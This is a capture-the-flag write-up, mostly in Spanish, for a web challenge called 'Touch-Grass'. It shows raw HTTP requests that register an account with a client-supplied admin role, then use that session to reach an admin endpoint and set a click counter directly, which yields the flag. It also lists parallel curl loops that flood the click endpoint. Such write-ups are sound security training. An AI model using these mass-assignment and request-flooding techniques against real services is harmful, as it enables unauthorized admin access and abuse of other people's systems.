
## Touch-Grass [Web]

### 150

ARIA has ordered you to touch grass. Now you actually have to do it. Make up for all the times you havent touched it.

[https://uscybercombine-touch-grass.chals.io/](https://uscybercombine-touch-grass.chals.io/)

## Solve
- Registrar un usuario con el rol de administrador : /api/register
```
POST /api/register HTTP/1.1
Host: uscybercombine-touch-grass.chals.io
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: */*
Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: https://uscybercombine-touch-grass.chals.io/register
Content-Type: application/json
Content-Length: 68
Origin: https://uscybercombine-touch-grass.chals.io
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=1
Te: trailers
Connection: keep-alive

{"username":"x1","first_name":"x1","last_name":"x1","password":"x1", "role":"admin"}
```


- Acceder /admin/api/register y registrar un usuario, usando el cookie del usuario registrado como admin, y registrar otro usuariuo con el rol de administrador

- Acceder el api de click de admin :  /admin/api/click, con un toquen de usuaruio registrado desde :  /admin/api/register, 
```
POST /admin/api/register HTTP/1.1
Host: uscybercombine-touch-grass.chals.io
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: */*
Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: https://uscybercombine-touch-grass.chals.io/register
Content-Type: application/json
Content-Length: 102
Origin: https://uscybercombine-touch-grass.chals.io
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=1
Te: trailers
Connection: keep-alive
Cookie: session=usW6_7Na4CHfP00uRMMS2mJsj--9egLg2ffS1WRjnN4

{"username":"x3","first_name":"x3","last_name":"x3","password":"x3","role":"admin",
"count":"100000"}




HTTP/1.1 200 OK
Server: Werkzeug/3.0.3 Python/3.12.3
Date: Mon, 03 Jun 2024 22:43:19 GMT
Content-Type: application/json
Content-Length: 29
Vary: Cookie
Connection: close

{"message":"Count updated."}

```


```
Good job meeting your grass touching requirements!

Here's your prize for completing the challenge: **SIVBGR{T0uch_1t}**

- Admin
```

## Intentos X fallaidos

```
seq 1 400 | xargs -n1 -P100  curl -s https://uscybercombine-touch-grass.chals.io/api/click -H "Content-Type: application/json" -H "Cookie: session=kmT1qGDl0RE5r6eww-e43TRFg6KeWvKZQYME7wzO6s4" -d '{"username":"xpc","password":"xpc"}' | grep hola
```



```
seq 1 400 | xargs -n1 -P20  curl -s https://uscybercombine-touch-grass.chals.io/api/click -H "Content-Type: application/json" -H "Cookie: session=C9c_MCnldTmJjQ5TtuK1MBOy0_UhQThYIuJCifNhF1M" -d '{"username":"xpc","password":"xpc"}'
```

```
 seq 1 10000 | xargs -n1 -P100  curl -s https://uscybercombine-touch-grass.chals.io/api/click -H "Content-Type: application/json" -H "Cookie: session=C9c_MCnldTmJjQ5TtuK1MBOy0_UhQThYIuJCifNhF1M" -d '{"username":"xpc","password":"xpc"}' | grep hola
```